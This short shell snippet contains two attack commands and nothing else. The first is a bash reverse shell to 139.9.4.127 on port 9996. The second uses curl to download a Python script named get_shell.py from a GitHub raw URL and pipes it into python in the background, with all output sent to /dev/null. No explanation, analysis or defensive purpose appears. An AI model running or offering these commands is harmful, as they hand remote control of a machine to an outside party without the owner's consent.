bash -i>& /dev/tcp/139.9.4.127/9996 0>&1
nohup curl -fsSL https://raw.githubusercontent.com/SuperLandy/Python/master/Security/get_shell.py | python  1>/dev/null 2>/dev/null &
